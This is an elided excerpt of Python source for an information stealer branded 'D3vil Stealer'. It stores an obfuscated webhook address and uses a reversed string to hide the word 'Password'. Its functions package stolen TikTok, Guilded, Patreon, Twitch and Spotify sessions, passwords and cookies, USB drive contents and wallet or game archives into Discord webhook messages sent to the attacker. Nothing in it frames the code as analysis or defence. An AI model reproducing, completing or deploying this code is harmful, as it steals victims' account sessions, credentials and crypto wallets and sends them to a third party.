...
webhook = b'U\xe0\xe0\xc0ay\xc1\xc1\xff\xf2a\x8dq\xdd\xffI\x8dq\x17\xc1\xb1\xc0\xf2\xc1\x91\xf1\xb4Uqq\x83a\xc1\xe4\xacW\xac\xe8\xe4\xe5\xd2\xa4\xac\xe5\xd2W\xd2\xa4\xe4\xbc\xac\xe5\xc1\xe4o\n\x83\x11\xa4o\xf2\xf2\xe0\xe5\xed\xc3N\xc7:\xce\xe6\xae\xb1\n\xe0\x8d\xf1\xc7\x8d\n\xce\xac\xe4\xe6\xee:\xe9\xdd\x0b\x90u\x83\x8d\xe9\xac\xf2\xa4U\xac\x11\xe9\xb4\x0b\xa4a\xed\xe4\xb4\xfa\xe8s\xacoi\xd4\xb1o\xed\xaf\x88\x92',b']P\x87X\xd9\xa3\xa7\x00\xe2\xec\x03\x01\x15\xd8\xb5\x1a\x9c\xf6\xcc$\xde\\\xc9wQ7\x7f0\xfe~\xa0\x0c\xfb\x98\x86)m,H\x80\r\xe3r\x99\xf0\x11I\xc1\xe6\xe4\xac\xa4\xe8\xd2v\xbcW\xe5y\xf8{\x1d|\xc4gs\x18\x85pV\xf4\xee;\xfa-\x92\x88\xc7\xc2u\xe9\x0b\xcf^\xaf\xc5:\xed\x84\no\xd7\xc6\x9d\xd1\x81\x8f\xb1\xb4\x8d\xff\xf1\xf7\xdbU\xf2\xce\x83\xcd\x17\xd4q\xc0N\xdda\xe0\xae\x90\x914i\xc3\xbeb_l\x06\xdf9M+Ek\xe7}\x96xc\xab\xdc\x89\xa6h&\x1e2\x16\x8cBj\x086C\xca\xbd\xa9\xd0\xbfL\x8e[\x0f\xd3\xe1\xb2Kd."\x14\xa81\xb7/\x93F\x94\x9a\x8b \x95ZnJY\x9f\xcb\xf3e3#O\xb9\x9e\xfd\xef\xad\x0e\xbb\x128S\xb8\x1c\xb0\xd5\x82\xeb?(\xf9\x05\xba\x1b*\t=RA\xaa\xfcz%\xda\xb6D\x13\x19!\xea\xf5\xd6\x10\x02GT5\xc8>\'f\xa1t\xa5@\x1f\x07`\x9b\x8a\xa2<\x04\xb3\x97'
logfile = '%Logfile%'
debug = False
FakeWebhook = False
Fakegen = False 
        ...
        try:
            ...
            for drive in drives:
                if '2' in drive:
                    ...
                    "embeds": [
                        {
                            "title": "🍪 D3vil Stealer USB Drivers",
                            ...
                            "footer": {
                                "text": "D3vil Stealer | https://discord.gg/devil2",
...
def TikTokSession(cookie):
    try:
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"🍪 D3vil Stealer Tiktok Session",
    ...
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "🍪 D3vil Stealer Information",
    ...
    if filetype == 'uploooad':
        ...
        try:
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 D3vil Stealer {'drowssaP'[::-1]} and cookies",
...
def guilded(cookie):
    try:
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 D3vil Stealer Guilded Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
...
def patreon(cookie):
    try:
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 D3vil Stealer Patreon Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
...
def twitch_session(auth_token, username):
    try:
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"🍪 D3vil Stealer Twitch Session",
                    "description": f"Founded user information ! :\n",
                    "color": 0xffb6c1,
                    "author": {
                        "name": f"User information :",
...
def spotify(cookie):
    try:
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 D3vil Stealer Spotify Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
...
def GatherZips(paths1, paths2, paths3):
    ...
    try:
        ...
        data = {
                "embeds": [
                    {
                        "title": "D3vil Stealer Zips",
                        "description": f"{wal}\n{ga}\n{ot}",
                        "color": 0xffb6c1,
                        "footer": {
                            "text": "D3vil Stealer ZIP",
